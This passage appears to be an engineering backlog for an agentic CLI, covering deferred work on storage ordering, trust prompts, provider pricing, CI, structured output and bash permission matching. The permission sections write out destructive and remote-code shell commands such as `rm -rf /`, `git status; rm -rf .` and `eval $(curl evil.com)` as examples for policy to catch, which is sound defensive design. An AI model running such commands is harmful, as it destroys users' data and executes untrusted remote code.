- Decide: trust=untrusted hard-filtered? Surface with `[memory: untrusted]` reason marker? Operator opt-in via `policy.retrieval.allow_untrusted = false` default?
- `tests/retrieval/memory-view.test.ts` — pin the chosen contract.

**Pull-in signal:** any of: (a) detector quality measurement reveals untrusted bodies systematically degrading retrieval relevance; (b) security review flags the surface explicitly; (c) operator-reported incident where untrusted body content shaped a model decision.

## Monotonic seq tiebreaker on the remaining time-ordered tables

**Status:** noted during the M3/Step 2.4 audit pass (2026-04-29).

**What it is:** migrations 007 (messages.seq) and 008 (sessions.seq)
fixed the timestamp-tie ordering bug for the two tables whose
listings drive resume behavior. The same bug shape exists in three
more time-ordered repos that fall back to UUID lex on tied
timestamps:

- `src/storage/repos/tool-calls.ts:130` — `ORDER BY created_at ASC, id ASC`
- `src/storage/repos/bg-processes.ts:148, 161` — `ORDER BY spawned_at DESC, id ASC`
- `src/storage/repos/approvals.ts:66` — `ORDER BY decided_at ASC, id ASC`

**Effect today:** none observable. Each listing function is
exported but has no production call site (verified via grep).
The listings are reserved for the audit CLI / recap / forensics
work that hasn't landed yet.

**Fix shape:** mirror migrations 007/008 — add `seq INTEGER NOT
NULL DEFAULT 0` to each table, populate atomically at INSERT time
via the `MAX(seq)+1` subquery, backfill via ROW_NUMBER over the
existing ORDER BY, secondary `seq` in each list query.

**Pull-in signal:** any of these listings gets wired to a live
consumer (audit CLI, recap subsystem, the `agent audit` command
in spec §13). At that point the ordering becomes load-bearing
and the same class of bug that hit messages/sessions becomes
visible to users. Apply the migrations together rather than
piecemeal — the schema-change cost amortizes across three repos
that all need it.

**Why deferred:** YAGNI. Adding three migrations + index changes
for tables nobody queries today is schema churn for a theoretical
bug. The pattern is well-established in 007/008 so the eventual
fix is mechanical.

---

## Trust prompt: aggregate-hash re-prompt on `.agent/` / `AGENTS.md` change (`AGENTIC_CLI §9.1`)

**Status:** the primary trust-prompt work is **done**. Both original
pull-in signals fired during M3/M4: the modal UI landed (`modalManager`
+ `askTrust` in `src/cli/repl.ts`), and multiple trust-relevant
artifacts are loaded today (permissions YAML, hooks, playbooks,
AGENTS.md). The full TODO entry was substantially closed without an
explicit close-out; this entry now tracks only the **residual**.

**What's already in:**

- `src/trust/` subsystem (`paths.ts`, `storage.ts`, `index.ts`).
- `~/.config/agent/trusted_dirs.json` persisted with absolute paths.
- `askTrust` modal wired in REPL boot **before** opening the editor
  or loading the rest of `.agent/` — fires on first-boot in a new
  cwd; subsequent boots in a trusted cwd skip the prompt.
- `[y/N]` answer flow with timeout + cancel paths covered by
  `tests/tui/modal-manager.test.ts` (slice 137 ops-3) and the
  REPL integration tests.

**What's still deferred — aggregate hash + re-prompt:**

Spec §9.1 calls for a hash of every loaded `.agent/` artifact +
`AGENTS.md`, stored alongside the trusted-dir entry. Re-prompt on
any subsequent boot where the hash diverges (operator updated
`.agent/permissions.yaml`, a new hook landed, AGENTS.md grew a
section). Storage explicitly documents this gap at
`src/trust/storage.ts:8-13`:

> "Spec §9.1 also calls for an aggregate hash of the project's
> `.agent/` content + `AGENTS.md`, with re-prompt on any change.
> That hardening is deferred to a follow-up slice; absent it, an
> operator who clones into a previously-trusted path inherits the
> trust without a re-confirm."

**Why this remainder is deferred:**

1. **Threat shape today is narrow.** Operator types `agent` in
   their own repo, not in arbitrary cloned trees from third parties.
   The hash-mismatch class of attack assumes a trusted cwd whose
   `.agent/` was rewritten between boots (by a co-located process or
   by `git pull`-ing changes); plausible but not currently observed.
2. **`inspect` mode is the real UX answer.** Spec wires the
   re-prompt to a `[y/N/inspecionar]` choice — "inspect" diffs
   `.agent/` against the trusted hash and renders what changed.
   That's a TUI subsystem of its own. Re-prompt without inspect is
   useless friction (operator just re-clicks `y`); inspect needs a
   diff renderer the project doesn't have yet.
3. **Spec §9.1 sub-hash for MCP.** `AUDIT.md §1.5`
   `mcp_manifest_history` is the same shape (hash + re-prompt) for
   MCP manifests. Bundle the two — the diff renderer and the hash
   scheme are shared.

**Pull-in signal:**

Pull this back into scope when EITHER:

- A team-shared trust storage scenario surfaces (more than one
  operator, or a cwd that team members `git pull` updates into).
  Hash mismatch becomes load-bearing the moment "an artifact under
  `.agent/` changed between trusted boot and now" stops being a
  hypothetical.
- MCP manifest trust lands. The `mcp_manifest_history` work
  expects the same hash-and-re-prompt machinery; bundle the work
  rather than building two parallel implementations.

**Spec reference:** `AGENTIC_CLI.md §9.1`, `SECURITY_GUIDELINE.md §9.1`,
`AUDIT.md §1.5` for `mcp_manifest_history` table that the MCP-trust
half consumes.

---

## Rename `cost_per_1k_*` → `cost_per_1m_*` on `ProviderCapabilities`

**Status:** field-name vs value-unit mismatch. Surfaced during the
M2 / Step 6 smoke baseline run. Math fixed inline; rename
deferred.

**What it is:** every `ProviderCapabilities` entry stores rates in
dollars-per-million tokens (the convention Anthropic, OpenAI, and
Google publish in). The fields are spelled `cost_per_1k_input`,
`cost_per_1k_output`, `cost_per_1k_cached_input`,
`cost_per_1k_cache_write`. The math in `src/providers/cost.ts`
now divides by `1_000_000` to match the values; the field name
still says `_1k_`, which is a footgun for anyone adding a new
provider.

**Why deferred:**

1. **Cross-cutting rename.** Touches `src/providers/types.ts`,
   `src/providers/cost.ts`, all three provider capabilities files
   (`anthropic`, `openai`, `google`), and `docs/spec/PROVIDERS.md`
   §5 (which sources the values). Several test files reference
   the field names directly. Doing it as a separate commit keeps
   the diff readable and the Step 6 commit focused on the eval
   harness.
2. **No correctness risk today.** The numbers are right and the
   math is right. The only cost is naming clarity for future
   contributors.
3. **Spec PR first.** The field name lives in the typed contract
   that PROVIDERS.md §5 documents; a rename without a spec
   amendment would diverge code from spec. Per CLAUDE.md, the
   spec leads, code follows.

**Pull-in signal:**

Pull when EITHER:

- A new provider is being added to the registry (we'd write the
  wrong field name otherwise).
- The cost telemetry surface changes (e.g., we add tier rates,
  per-region pricing) — bundle the rename into that PR.

**Spec reference:** `PROVIDERS.md §5`, `src/providers/cost.ts`
(comment block already flags the followup).

---

## Add gpt-5.x family to the OpenAI registry

**Status:** registry stuck on gpt-4o lineage. Surfaced during
the M2 / Step 6 pricing audit when the user shared the
current OpenAI pricing table.

**What it is:** `src/providers/openai/capabilities.ts` declares
`gpt-4o` and `gpt-4o-mini` only. The current OpenAI flagship
family is gpt-5.x:

| Model | Input ($/M) | Cached ($/M) | Output ($/M) |
|---|---|---|---|
| gpt-5.5 | $5.00 | $0.50 | $30.00 |
| gpt-5.5-pro | $30.00 | – | $180.00 |
| gpt-5.4 | $2.50 | $0.25 | $15.00 |
| gpt-5.4-mini | $0.75 | $0.075 | $4.50 |
| gpt-5.4-nano | $0.20 | $0.02 | $1.25 |
| gpt-5.4-pro | $30.00 | – | $180.00 |

Plus a long-context tier with different pricing for gpt-5.5
and gpt-5.4 — that tier doesn't fit the current
`ProviderCapabilities` shape (single input/output rate per
model) and would require a contract change.

**Why deferred:**

1. **Feature work, not hardening.** Adding new models means
   new defaults (which one becomes `recommended_for:
   autonomous`?), new capabilities matrix entries, and a
   spec amendment to `PROVIDERS.md §5`. That's a feature
   PR, not part of the M2 closure.
2. **gpt-5.x uses `max_completion_tokens`, not `max_tokens`.**
   Our adapter sends `max_tokens`. Adding gpt-5.x models
   without adapter changes would 400 every request. Need a
   capability flag (`uses_max_completion_tokens: true`) and
   a code branch in `src/providers/openai/index.ts`.
3. **Long-context tier requires schema change.** Current
   `cost_per_1k_*` fields assume a single rate per token
   class per model. gpt-5.5 prices Short context vs Long
   context differently — adding this means
   `cost_per_*` becomes a function of effective context
   size, or splitting into per-tier model entries
   (`gpt-5.5-short`, `gpt-5.5-long`). Spec decision.
4. **Reasoning model semantics.** gpt-5.x is a reasoning
   family — `o`-series-style internal thinking that bills
   under `output_tokens` but isn't user-visible. Smoke would
   under-budget if cases assume non-reasoning token costs.
   Need to handle `reasoning_tokens` in usage normalization.

**Pull-in signal:**

Pull this back when EITHER:

- A user prompt requires reasoning quality the gpt-4o family
  can't deliver, AND the cost envelope makes gpt-5.4-mini
  reasonable as the new OpenAI default.
- Anthropic releases a competing reasoning model and we
  want head-to-head measurement (forces the spec PR
  anyway).

**Spec reference:** `PROVIDERS.md §5` (model registry table
needs amendment), `TOKEN_TUNING.md §3` (reasoning token
accounting), `src/providers/openai/index.ts` (param shape).

---

## Smoke baseline against Gemini

**Status:** Gemini adapter has unit coverage but never ran
end-to-end. Surfaced during the M2 / Step 6.3 multi-provider
review.

**What it is:** run `bun run eval:smoke -- --model
google/gemini-2.5-flash --repeat 3` against a real Gemini
endpoint. Same shape as the Anthropic and OpenAI baselines
already documented in BACKLOG (Step 6.2 / 6.3). Goal: 24/24
with `compaction_triggered: { strategy: llm }` confirmed on
the third provider.

**Why deferred:**

1. **Gemini pricing in registry is illustrative, not real.**
   `src/providers/google/capabilities.ts` literally says so
   in a comment ("Numbers below match the unit convention
   used elsewhere in the registry — they are not committed
   real Gemini prices"). Running smoke today would test the
   adapter's wire shape against fake pricing, conflating
   two issues. Cost numbers in the baseline would be
   meaningless.
2. **Gemini has different correlation semantics for
   tool_results.** Spec calls this out in
   `ProviderToolResultBlock.name` — Gemini correlates
   results to calls by name, not by id. The Anthropic
   adapter strips `name` before sending; the OpenAI adapter
   uses `tool_call_id`. The Google adapter's behavior here
   needs validation under load — high probability of a
   `name`-class bug analogous to what the Anthropic smoke
   surfaced.
3. **Need a Gemini API key.** Operational dependency, not
   technical.

**Pull-in signal:**

Pull when EITHER:

- The pricing values in `google/capabilities.ts` get updated
  to real Gemini pricing (likely bundled with the
  `cost_per_1k_*` → `cost_per_1m_*` rename and a
  `PROVIDERS.md §5` amendment).
- A user workflow calls for Gemini specifically (the 2M
  context window or the price/quality on simple summarization
  tasks).

**Whichever lands first.** Bundle the smoke run with the
pricing fix so the baseline numbers are trustworthy from
day one.

**Spec reference:** `PROVIDERS.md §5` and `§7`,
`src/providers/google/{capabilities,index,stream}.ts`.

---

## CI gate on smoke

**Status:** smoke harness is CI-ready but no pipeline wired.
Tracked since Step 6.

**What it is:** GitHub Actions (or equivalent) workflow that
runs `bun run eval:smoke --repeat 3 --model
anthropic/claude-haiku-4-5` on every PR (and/or main push)
and blocks merge on regression. Gates on:

- 100% pass rate (24/24 with strict-pass semantics).
- Cost envelope: total ≤ $0.20/run (10× headroom over
  current baseline).
- Per-case stability: no `failCount > 0` in the
  `eval_case_aggregate` output.

**Why deferred:**

1. **Cost per PR is recurring spend.** Anthropic baseline
   today: $0.15 per CI run. At 50 PRs/week that's ~$30/mo.
   Trivial in absolute terms but real ops cost; needs a
   budgeting decision before turning on.
2. **Single-provider gate or multi-provider?** Running both
   Anthropic and OpenAI smoke per PR doubles cost
   ($0.16/run total). Multi-provider catches more
   regressions but costs more. Decision waits until
   Gemini lands so the spread is visible.
3. **Secret management.** `ANTHROPIC_API_KEY` (and OpenAI/
   Gemini if multi-provider) needs to live as a repo secret.
   Threshold question: who has merge access to the workflow
   file? A malicious workflow change could exfiltrate the
   key. Current repo is solo-author so low risk, but the
   policy should be set before the second contributor lands.
4. **Smoke catches the wrong class of bug for some PRs.**
   A docs-only PR shouldn't pay $0.15 to re-validate the
   adapter. Need a `paths-ignore` filter (skip on
   `docs/**`, `*.md`, etc.) to avoid burning budget on
   no-op runs. Easy but worth doing right.
5. **Need a baseline-drift detection mechanism.** If
   gpt-4o-mini tomorrow costs 10% more per request (OpenAI
   re-prices, infrastructure shift, etc.), should the gate
   fail or warn? Hard threshold means false-positives;
   warn-only means the gate is decorative. Need to decide
   the policy first.

**Pull-in signal:**

Pull this when EITHER:

- A second contributor is merging PRs (gate prevents merge
  of broken adapter changes, value is concrete).
- A regression actually slips through and burns time
  debugging post-merge — that's the moment the gate
  becomes obviously cheap.

**Pre-requisites the gate depends on:**

- Multi-provider baseline stable (this is in place after
  Step 6.3).
- A `eval:regression` tier (~100 cases) so smoke doesn't
  carry the full validation load. Spec §16 places this in
  M3+.
- Baseline-drift policy decision (above).

**Spec reference:** `AGENTIC_CLI.md §16` ("Roda em CI.
Comparação contra **golden traces** versionados. Mudou
prompt do system? Roda eval. Regrediu? PR bloqueado.").

---

## Native structured output for compaction / critique / recap

**Status:** noted while reviewing the M4 critique branch
(2026-05-08). The contract slot exists
(`Provider.generateConstrained`) but is unused by the harness
paths that emit JSON-shaped output.

**What it is:** three subsystems currently emit JSON between
sentinel markers and parse the result with a custom parser.
Failure rate observed in the M4 real-eval was ~5% (markers
missing, malformed JSON, Unicode quotes in place of ASCII,
etc.). Today's call sites:

| Surface | Current mechanism | Reliability |
|---|---|---|
| Tool calls (`task`, `bash`, ...) | Native tool calling | Strong |
| Compaction summary | Markers + JSON parse | Weak |
| Critique output | Markers + JSON parse | Weak |
| Recap render | Markers + parse | Weak |
| Memory write proposals | Tool args | Strong |

The marker convention was chosen for cross-provider uniformity
at a time when JSON modes were patchy. Today every cloud
provider in the registry has a native structured-output path:

| Mechanism | Provider support | Guarantee |
|---|---|---|
| Tool calling with `input_schema` | Anthropic, OpenAI, Google | Strong (provider-validated) |
| `response_format: json_object` | OpenAI, partial Anthropic | Medium (no types in schema) |
| `response_schema` (JSON Schema) | Google, OpenAI Structured Outputs | Strong |
| GBNF / EBNF grammar | llama.cpp, vLLM | Strong (token-level) |
| Markers + parse | Any | Weak (best-effort) |

When a parse fails today, the critique engine writes
`strategy='failed'` to `critique_runs` and the run survives
(engine is fail-soft). Compaction falls back to the
deterministic summarizer when the marker close-tag is missing,
so the operator silently loses the semantic summary.

**Why deferred:**

1. **Real-world failure rate is low under default config.**
   5% sounds large until you remember that critique mode `off`
   is the default. The failure envelope only matters for
   opt-in `mode='always'` + long sessions. Compaction shares
   the parser shape but is invoked rarely (per-trigger, not
   per-step). Recap is on-demand. The blast radius today is
   "audit-row noise + fallback to deterministic path", not
   user-visible breakage.
2. **Cross-provider abstraction is non-trivial.** Each
   provider exposes structured output differently; a naive
   wire-up would scatter provider conditionals into the
   engine. The right shape is a schema-aware layer one step
   above the `Provider` interface, accepting a JSON Schema
   and routing to tool_use / response_format / response_schema
   / GBNF, with a marker fallback for providers that lack any
   constrained mode (older local models). Worth designing
   once, not per call site.
3. **Streaming + structured is still emerging.**
   `generateConstrained` returns the full string at the end,
   sacrificing streaming UX. Some providers already support
   streaming structured output (Anthropic tool_use streaming,
   OpenAI delta-mode structured outputs); bundling streaming
   into the same design pass avoids two rewrites.

**Pull-in signal:**

Pull when EITHER:

- A subsystem starts running `mode='always'` critique (or any
  equivalent always-on JSON path) and `parse_failed` /
  `markers_missing` audit rows accumulate enough to be visibly
  noisy. The typed contract pays for itself within weeks at
  that point.
- A new subsystem is added that needs JSON-shaped LLM output
  (planner emits structured plan, reviewer subagent emits
  structured findings). Cheaper to ship the abstraction once
  than to add a third marker-parser call site.

**Concrete shape (when pulled):**

```ts
const tool: ProviderToolDef = {
  name: 'emit_critique',
  description: 'Emit your structured critique',
  input_schema: {
    type: 'object',
    properties: {
      issues: { type: 'array', items: { /* ... */ } },
      overall_confidence: { type: 'number' },
    },
    required: ['issues', 'overall_confidence'],
  },
};
const req: ConstrainedRequest = {
  ...gen,
  tools: [tool],
  tool_choice: { type: 'tool', name: 'emit_critique' },
};
```

**Estimated work:**

- ~1 week — wire `generateConstrained` into the critique
  engine, fallback to markers when the provider lacks a
  structured mode.
- +1 week — same for compaction.
- +2 weeks — schema-aware abstraction above the provider
  contract; route a single JSON Schema to tool_use /
  response_format / response_schema / GBNF.
- Test suite: per-provider conformance (output respects the
  schema, not merely parses) + fallback semantics.

**Comparison vs. status quo:**

| | Markers + parse | Native structured |
|---|---|---|
| Provider effort | none (string interpreted) | provider enforces at token level |
| Observed failure rate | ~5% | <1% |
| Cost | same | same |
| Vendor lock-in | none | per-provider feature mapping |
| DX (engine code) | custom parser | typed contract |

**Spec reference:** `PROVIDERS.md §3` (Provider contract),
`CONTEXT_TUNING.md` (compaction), `AGENTIC_CLI.md §5.4` and
`ORCHESTRATION.md §6` (critique), `RECAP.md`.

---

## Permission policy ergonomics

**Status:** noted during the M4 critique branch review
(2026-05-08). The permission engine is functionally complete;
usability gaps surfaced repeatedly while running multi-step
flows during the branch.

**What it is:** the permission hierarchy (enterprise → user →
project → session) and the YAML rule shape work, but the
operator surface around them has friction. Six concrete pain
points observed:

a) **Discovery.** Operators don't know what permissions they
need until they hit the modal. Typical session yields 10–30
modals. Recurring workflows pay the cost on every restart.

b) **No pattern recognition.** Approving `bash("npm test")`
five times in one session does not surface a "promote to
allowlist?" suggestion. Only the modal's
"yes-allow-all-during-this-session" toggle exists, and it is
volatile (lost on restart).

c) **Visualization gaps.** `/perms` shows the merged policy
but does not show: what was approved this session, the
history of denials, or the practical diff between modes
(`strict` vs `acceptEdits`).

d) **Mode names are opaque.** `strict | acceptEdits | bypass`
require reading `AGENTIC_CLI.md §8` to interpret. New
operators have no inline hint.

e) **Glob is fragile for shell.** `command_glob: 'rm *'`
matches both `rm -rf /` (intended) and `git rm file.txt`
(probably not intended). Bash's command space is semantically
rich; text glob over the raw command string is a leaky
abstraction.

f) **Denial errors are unhelpful.** Tool denied → `ToolError`
with a generic message to both the model and the operator.
Neither sees which rule fired or which layer holds it.

**Why deferred:**

1. **Not a correctness gap.** Every pain point above is
   friction, not a bug. The engine refuses what it should
   refuse and allows what it should allow. Operators
   tolerate the friction today because session count is
   low and the team is small.
2. **Adjacent subsystems should land first.** Pattern
   learning (Tier 2 below) needs durable session-scoped
   audit history that today only exists transiently. Tier 4
   (AST-based bash matching) needs a shell-parser dependency
   decision the codebase hasn't made yet.
3. **Risk of incentivizing `bypass`.** Premature ergonomics
   work that surfaces "easy approve" affordances without
   first exposing the underlying policy can push operators
   toward `bypass` mode, the opposite of the safety goal.
   Order matters: discoverability before promotion.
4. **Composes with sandbox.** Sandbox of tool execution is
   the structural defense layer; ergonomics is the operator
   layer above it. Doing ergonomics first means redoing some
   of the surface once sandbox lands.

**Pull-in signal:**

Pull when EITHER:

- A second operator joins the project and modal volume
  becomes a complaint (the discovery pain compounds with
  team size).
- The session-history audit work referenced in `AUDIT.md`
  lands, unblocking pattern learning without a new schema.
- An incident is traced to a glob false-positive — Tier 4
  becomes load-bearing the moment a permissive `*` rule
  allows something the operator did not intend.

**Tier breakdown (when pulled):**

| Tier | Scope | Estimated work |
|---|---|---|
| 1 | Discoverability: `--explain-permissions`, modal cites matching rule + layer, `/perms why <tool>` | ~2 weeks |
| 2 | Pattern learning (opt-in): N-approval prompt to promote, `--learn-mode`, `/perms suggestions` | ~3 weeks |
| 3 | Policy templates: `safe-readonly`, `trusted-fullstack`, `ci-locked`; `agent init --template=<name>` | ~1 week |
| 4 | AST-based bash matching; explicit relative-vs-absolute path glob semantics; rule composability (any-of / all-of) | ~2 weeks |
| 5 | `/perms diff session`, `/perms commit` (promote session-allowlist to project layer with confirm), `/perms revert` | ~1 week |

**Trade-offs:**

- **Pro:** UX value per engineer-day is high; zero
  architectural risk (pure surface work).
- **Pro:** Reduces modal fatigue, so operators leave strict
  mode on rather than defaulting to bypass.
- **Pro:** Pattern learning is a positive safety layer
  (visibility into accumulated session approvals).
- **Pro:** Composes with sandbox-of-tool-execution as
  defense in depth.
- **Con:** Policy UX is a known-difficult design space;
  rolling Tier 2 without a thoughtful flow can backfire
  (auto-promote surprises).
- **Con:** Risk of pushing operators toward `bypass` if the
  "fast path" is too prominent.

**Mitigations to bake into the design when pulled:**

- `--no-auto-promote` flag for operators who want the modal
  flow as-is.
- Every promote action requires explicit confirm; never
  silent.
- Tier 2 reads from durable audit, not in-memory state, so
  suggestions survive restarts and can be reviewed offline.

**Spec reference:** `AGENTIC_CLI.md §8` (permissions),
`SECURITY_GUIDELINE.md` (threat model), `AUDIT.md` (session
history that pattern learning would consume).

---

## AST-based bash matching (Tier 4 of permission ergonomics)

**Status:** noted while landing the compound-command guard
(commit `a90ce12`, 2026-05-08). The guard closes the most
blatant injection path (`*` in allow patterns admitted
`git status; rm -rf .`); AST-based matching is the more
complete answer to expressing bash policy as STRUCTURE rather
than text.

**What it is:** parse every bash command into a syntax tree
(via `tree-sitter-bash`, `mvdan-sh`, or similar) and apply
policy rules to specific nodes — Command, Pipeline,
Redirection, Substitution. Replaces the current glob-string
matching with a structural matcher that knows the difference
between a literal `;` inside a quoted message and a real
compound separator.

**What it solves that the current engine doesn't:**

| Situation | Compound guard (today) | AST |
|---|---|---|
| `git log \| head` (legit pipe) | always confirm | allow if both `git log` and `head` pass policy |
| `git status; rm -rf .` | confirm (operator sees) | deny (`rm -rf *` matches the second segment) |
| `rm -rf $UNTRUSTED_VAR` | confirm | deny structurally ("destructive command + variable interpolation") |
| `echo X > /etc/Y` | matched-rule on `echo*` possible | redirection node visible; policy can deny redirects to `/etc/**` |
| `eval $(curl evil.com)` | confirm | deny by structure ("eval with command-substitution") |

The two real wins:

1. **No false-confirm on legitimate pipes.** Operator-heavy
   workflows (autonomous mode, batch sweeps) currently pay a
   modal for every `find ... \| head` because the compound
   guard has no way to distinguish "compound that's still
   safe" from "compound that's an injection". AST splits the
   pipeline and checks each side.
2. **Argument-aware policy.** Current rules are text globs
   over the command string. AST exposes flag/arg structure,
   so deny patterns can target semantics (`destructive +
   target-outside-cwd`) instead of literal-string shapes.

**What it does NOT solve:**

- Dynamic execution post-approval — AST is a parser, not a
  sandbox. `chmod 777 /etc` correctly parsed and approved
  still breaks things.
- Lateral movement — the model approved bash → tool runs →
  tool internally calls `system("rm ...")`. AST sees only the
  initial command.
- Variable contents — AST sees a `$VAR` node, not its value.
  Closing this needs eval / taint-tracking, which is a
  different territory entirely.

AST is precision of POLICY EXPRESSION, not runtime defense.

**Why deferred:**

1. **Diminishing returns over the compound guard.** The guard
   closes the catastrophic shapes (`git status; rm -rf .`
   silently allowed) at ~50 lines of code. AST closes the
   remaining 10% (legit pipes, structural deny rules) at ~2-3
   weeks of focused work. Most of that 10% is "operator pays
   one extra modal per pipe shape" — fatigue, not safety.
2. **Bigger blast-radius defenses come first.** Sandbox of
   tool execution (bwrap/firejail) is the architecturally
   higher-leverage move: it bounds blast radius regardless of
   how policy was expressed. AST competes with sandbox for
   eng time and loses on impact.
3. **Bundle weight.** `tree-sitter` (~5MB WASM) + grammar
   (~500KB) is real growth for a CLI tool. Worth paying when
   the value is concrete; not worth paying for marginal
   policy precision.
4. **Policy schema redesign.** Today: `allow: ["git status*"]`.
   With AST, three options: (a) new structural schema
   (`allow: { command: 'git', args_prefix: ['status'] }`,
   breaking), (b) compile globs to AST patterns (compiler
   work), or (c) hybrid — globs for the simple case, AST
   for compound. Each is its own design pass before any
   code lands. Spec PR work is non-trivial.

**Pull-in signal:**

Pull when ANY of:

- Autonomous-mode workloads (where the agent fires bash
  commands faster than a human reviews) become routine and
  the compound guard's "every compound = modal" creates
  measurable fatigue. Visible in audit: many `confirm`
  decisions on the same compound shape, all approved.
- A real-world policy bypass via the current matcher's
  string-glob limits surfaces (operator reports
  "I had `allow: foo*` and got bitten by `foo$(...)`"). One
  incident is enough — the existing guard's heuristic for
  `$(...)` detection has known gaps under specific quote
  combinations.
- Sandbox of tool execution lands and the next bottleneck on
  trust becomes "operator wants to express semantic safety
  rules" (e.g., "deny any write outside cwd"). At that
  point the AST work compounds with the sandbox to give
  defense-in-depth.

**Pre-requisites the project should have first:**

- ✅ ~~Sandbox of tool execution (`AGENTIC_CLI §9.1` M4.x). Cheaper
  defense, larger impact.~~ — **Met as of slices 118-119** (Linux
  bwrap + macOS `sandbox-exec` `hide_paths` defense), slice 119
  closes the macOS half via SBPL. Sandbox profile selection +
  hide_paths cover the structural defense the original TODO
  expected to land first. The other two pre-reqs below remain.
- Static analysis of operator-supplied policy (warn at boot
  when a policy contains `*` in allow patterns alongside
  metachars in deny — pedagogical, lighter than AST).
- Permission ergonomics Tier 2-5 (pattern learning,
  templates, etc) closer to landing — those build a base of
  operator-edited policies that an AST migration would
  need to handle.

With the sandbox pre-req met, the primary pull-in signal
remaining is operator-articulated demand for semantic policy
rules — a concrete complaint like "I want to allow any safe git
command but block destructive ones" or "deny redirect to `/etc/**`
keeping cwd redirects" that glob can't express precisely.

**Estimated work (when pulled):**

- ~1 week — wire `tree-sitter-bash` into a parser module,
  basic node types exposed to the matcher
- ~1 week — refactor `engine.checkBash` to traverse AST
  with rule application per node
- ~1 week — schema redesign + migration of existing policies
  to the new shape, eval coverage proving no regression on
  current operator policies
- + spec PR cycle for `AGENTIC_CLI §8` policy schema and
  `SECURITY_GUIDELINE` updates

**Spec reference:** `AGENTIC_CLI.md §8` (permission policy
schema would change), `SECURITY_GUIDELINE.md` (threat model
adjustments), `src/permissions/matcher.ts` (current glob
matcher to be augmented or replaced).
